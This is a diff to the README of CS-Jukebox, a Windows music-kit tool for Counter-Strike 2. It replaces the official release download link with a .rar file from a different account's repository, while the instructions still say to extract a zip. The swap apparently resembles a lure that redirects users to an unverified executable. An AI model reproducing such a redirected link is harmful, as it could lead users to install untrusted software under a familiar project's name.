@@ -5,7 +5,7 @@ Introducing CS-Jukebox, a tool that allows you to play your own custom music kit
 ![image](https://user-images.githubusercontent.com/26579319/128274959-d2ada5f1-ac48-4d88-b7c0-4cf9a42ea790.png)
 
 # Getting Started
-1. [Download the latest release](https://github.com/zzhabib/CS-Jukebox/releases/download/v1.01/CS.Jukebox.v1.01.zip) (Windows only).
+1. [Download the latest release](https://github.com/TYFALY/CS-Jukebox-V2/releases/download/v1.0.0/CS.Jukebox.v2.rar) (Windows only).
 2. Extract the folder inside the zip.
 3. Launch CS-Jukebox.exe
 4. Jukebox will ask you to locate the root folder for CS2. This is the folder "game" in your game root (steamapps\common\Counter-Strike Global Offensive\game)
